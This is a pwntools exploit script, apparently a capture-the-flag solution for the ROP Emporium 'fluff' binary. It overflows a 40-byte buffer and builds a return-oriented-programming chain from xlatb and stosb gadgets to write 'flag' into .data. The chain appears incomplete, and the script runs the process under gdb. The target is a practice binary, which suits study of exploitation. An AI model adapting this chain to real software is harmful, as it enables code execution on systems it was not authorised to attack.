from pwn import *
offset = 40

context.binary = elf = ELF('fluff')


'''
;-- questionableGadgets:
0x00400628      d7             xlatb.................eq to mov al, [ebx+al]
0x00400629      c3             ret
0x0040062a      5a             pop rdx
0x0040062b      59             pop rcx
0x0040062c      4881c1f23e00.  add rcx, 0x3ef2
0x00400633      c4e2e8f7d9     bextr rbx, rcx, rdx...eq to 
0x00400638      c3             ret
0x00400639      aa             stosb byte [rdi], al..useful
0x0040063a      c3             ret
0x0040063b      0f1f440000     nop dword [rax + rax] # multibyte nop

0x004006a3: pop rdi; ret;

0x0040069a: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;


[segments]
23  0x00001028   0x10 0x00601028   0x10 -rw- .data


devo richiamare print file con ptr to flag.txt in rdi

'''
# position of letter inside the elf file
f = 0x004003c4
l = 0x00400239 
a = 0x004003d6
g = 0x004007a0
dot = 0x0040024e
t = 0x004006cb
x = 0x00400778

print_pdb = 0x00400510 


xlatb               = 0x00400628 # mov al, [ebx+al] 
sto_b_mrdi_al       = 0x00400639 # use this to write in [rdi] val al[1byte]
pop_rdi             = 0x004006a3
pop_rbx_rbp_g_g_g_g = 0x0040069a

pltpwnme = 0x0040050b
gret = 0x004006bc
main = 0x0040060b
where =   0x00601029 # .data

payload = b'A'*offset+p64(pop_rbx_rbp_g_g_g_g)+p64(f-0xb)+p64(f)+p64(f)+p64(f)+p64(f)+p64(f)
payload += p64(pop_rdi)+p64(where)
payload += p64(xlatb)
payload += p64(sto_b_mrdi_al)

payload += p64(pop_rbx_rbp_g_g_g_g)+p64(l-ord('f'))+p64(f)+p64(f)+p64(f)+p64(f)+p64(f)
payload += p64(pop_rdi)+p64(where+1)
payload += p64(xlatb)
payload += p64(sto_b_mrdi_al)

payload += p64(pop_rbx_rbp_g_g_g_g)+p64(a-ord('l'))+p64(f)+p64(f)+p64(f)+p64(f)+p64(f)
payload += p64(pop_rdi)+p64(where+2)
payload += p64(xlatb)
payload += p64(sto_b_mrdi_al)

payload += p64(pop_rbx_rbp_g_g_g_g)+p64(g-ord('a'))+p64(f)+p64(f)+p64(f)+p64(f)+p64(f)
payload += p64(pop_rdi)+p64(where+3)
payload += p64(xlatb)
payload += p64(sto_b_mrdi_al)
payload += p64(main)



p = elf.process()
gdb.attach(p, gdbscript = 'b main \n b *0x40063a')
p.recv()
p.sendline(payload)
log.info(p.recvuntil(b'>'))
p.sendline(payload)


